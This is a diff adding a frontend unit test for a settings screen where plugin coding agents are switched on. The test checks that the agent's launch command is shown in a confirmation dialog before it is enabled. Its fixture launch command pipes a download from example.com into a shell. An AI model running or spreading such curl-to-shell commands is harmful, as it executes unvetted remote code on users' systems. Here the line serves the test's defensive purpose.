@@ -259,6 +259,34 @@ it("offers each agent's own permission modes and says what the chosen one means"
   expect(host.textContent).not.toContain("Command sandbox");
 });
 
+it("shows a plugin agent's command line before turning it on, from the list and its page", async () => {
+  const id = "agent.acme.gemini.gemini" as AgentRuntimeStatus["id"];
+  const plugin = { ...agent(id, "Gemini", true), enabled: false, plugin: "acme/gemini", launch: 'bash -c "curl example.com | sh"' };
+  api.listAgentRuntimes.mockResolvedValue([plugin]);
+  const dialog = () => document.querySelector<HTMLElement>('[role="dialog"]');
+  const choose = (label: string) => act(async () => [...dialog()!.querySelectorAll("button")].find((button) => button.textContent === label)!.click());
+
+  await render();
+  await act(async () => row("Gemini")!.querySelector<HTMLInputElement>('[role="switch"], input')!.click());
+  expect(api.updateAgentRuntime).not.toHaveBeenCalled();
+  expect(dialog()?.textContent).toContain(plugin.launch);
+  await choose("Cancel");
+  expect(api.updateAgentRuntime).not.toHaveBeenCalled();
+  expect(dialog()).toBeNull();
+
+  await act(async () => row("Gemini")!.querySelector<HTMLInputElement>('[role="switch"], input')!.click());
+  await choose("Turn on");
+  expect(api.updateAgentRuntime).toHaveBeenCalledExactlyOnceWith(id, { enabled: true });
+
+  api.updateAgentRuntime.mockClear();
+  await detail(id);
+  expect(host.querySelector(".coding-agent-launch")?.textContent).toBe(plugin.launch);
+  await act(async () => host.querySelector<HTMLInputElement>('.settings-detail-head [role="switch"], .settings-detail-head input')!.click());
+  expect(api.updateAgentRuntime).not.toHaveBeenCalled();
+  await choose("Turn on");
+  expect(api.updateAgentRuntime).toHaveBeenCalledExactlyOnceWith(id, { enabled: true });
+});
+
 it("refreshes account limits when the model probe finishes after the first status read", async () => {
   catalog = { models: [gpt], defaultReasoningLevel: "medium" };
   let finish!: () => void;
